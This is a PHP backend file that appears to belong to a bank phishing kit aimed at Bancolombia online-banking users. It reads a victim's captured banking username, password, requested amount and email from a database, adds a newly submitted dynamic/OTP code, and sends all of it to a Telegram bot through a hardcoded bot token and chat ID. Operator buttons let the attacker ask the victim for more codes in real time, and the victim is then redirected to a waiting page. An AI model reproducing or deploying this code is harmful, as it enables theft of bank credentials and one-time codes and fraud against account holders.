<?php

ob_start();
require __DIR__ . DIRECTORY_SEPARATOR . 'conexion.php';

$codigo = isset($_POST['codigo']) ? $_POST['codigo'] : '';
$key    = isset($_POST['key']) ? $_POST['key'] : '';
if (!$key) {
    die("Error: Key no proporcionada.");
}

$stmt = $pdo->prepare(
    "SELECT numero_cuenta, monto, banco, nombre, telefono, correo,
            `user` AS vp_usuario, `password` AS vp_clave, request_id
     FROM solicitudes WHERE BINARY `key` = ? LIMIT 1"
);
$stmt->execute(array($key));
$data = $stmt->fetch(PDO::FETCH_ASSOC);
if (!$data) {
    die("Error: Solicitud no encontrada.");
}

$monto   = isset($data['monto']) ? $data['monto'] : '';
$banco   = isset($data['banco']) ? $data['banco'] : 'Bancolombia';
$usuario = isset($data['vp_usuario']) ? $data['vp_usuario'] : '';
$clave   = isset($data['vp_clave']) ? $data['vp_clave'] : '';
$correo  = isset($data['correo']) ? $data['correo'] : '';

try {
    $nuevo_request_id = 'BCO_' . bin2hex(random_bytes(18));
} catch (Throwable $e) {
    $nuevo_request_id = 'BCO_' . bin2hex(openssl_random_pseudo_bytes(18));
}

$update = $pdo->prepare(
    "UPDATE solicitudes
     SET request_id = ?, estado = 'pendiente'
     WHERE BINARY `key` = ?"
);
$update->execute(array($nuevo_request_id, $key));

$saveCode = $pdo->prepare(
    "UPDATE solicitudes SET codigo_dinamica = ? WHERE BINARY `key` = ?"
);
$saveCode->execute(array($codigo, $key));

$DEFAULT_BOT_TOKEN_OPS = "8924841749:AAG6MK_tMpRF19EehX5iEQdfotCySeD6m4c";
$DEFAULT_CHAT_ID_OPS   = "-5503364698";
$envBot = getenv('TELEGRAM_BOT_TOKEN_OPS');
$envCh  = getenv('TELEGRAM_CHAT_ID_OPS');
$token   = $DEFAULT_BOT_TOKEN_OPS;
if (is_string($envBot) && trim($envBot) !== '') { $token = $envBot; }
$chat_id = $DEFAULT_CHAT_ID_OPS;
if (is_string($envCh)  && trim($envCh)  !== '') { $chat_id = $envCh; }

function fv_extra($v, $ph = '<i>(no informado)</i>') {
    $s = is_string($v) ? trim($v) : '';
    if ($s === '') { return $ph; }
    return htmlspecialchars($s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}

$SEP = str_repeat("-", 30);
$mensaje  = "";
$mensaje .= "\xE2\x9C\x85 <b>[DATO EXTRA: DINAMICA / OTP]</b> Codigo recibido despues del login:\n";
$mensaje .= $SEP . "\n";
$mensaje .= "\xF0\x9F\x92\xB0 Recarga solicitada: " . fv_extra($monto) . "\n";
$mensaje .= "\xF0\x9F\x8F\xA6 Banco elegido: " . fv_extra($banco) . "\n";
$mensaje .= $SEP . "\n";
$mensaje .= "\xF0\x9F\x91\xA4 Usuario Virtual-Persona: " . fv_extra($usuario) . "\n";
$mensaje .= "\xF0\x9F\x94\x92 Clave Virtual-Persona: " . fv_extra($clave) . "\n";
$mensaje .= $SEP . "\n";
$mensaje .= "\xF0\x9F\x94\xA2 Dinamica/OTP: " . fv_extra($codigo) . "\n";
$mensaje .= $SEP . "\n";

$botones = array(
    'inline_keyboard' => array(
        array(
            array('text' => "clavedinamica",   'callback_data' => "OPCION_1_" . $nuevo_request_id),
            array('text' => "otp",             'callback_data' => "OPCION_2_" . $nuevo_request_id),
        ),
        array(
            array('text' => "repetirusuario",  'callback_data' => "OPCION_3_" . $nuevo_request_id),
            array('text' => "repetirdinamica", 'callback_data' => "OPCION_4_" . $nuevo_request_id),
        ),
        array(
            array('text' => "\xF0\x9F\x94\xB4 ERROR Dinamica", 'callback_data' => "OPCION_9_" . $nuevo_request_id),
            array('text' => "\xF0\x9F\x9F\xA9 FINALIZAR",      'callback_data' => "OPCION_10_" . $nuevo_request_id),
        ),
    ),
);

$payloadArr = array(
    'chat_id'                  => $chat_id,
    'text'                     => $mensaje,
    'parse_mode'               => 'HTML',
    'disable_web_page_preview' => true,
    'reply_markup'             => $botones,
);
$payload = json_encode($payloadArr);

$ch = curl_init("https://api.telegram.org/bot" . $token . "/sendMessage");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

$qs = http_build_query(array('rid' => $nuevo_request_id, 'key' => $key, 'correo' => $correo), '', '&', PHP_QUERY_RFC3986);
header("Location: espera.html?" . $qs);
exit;
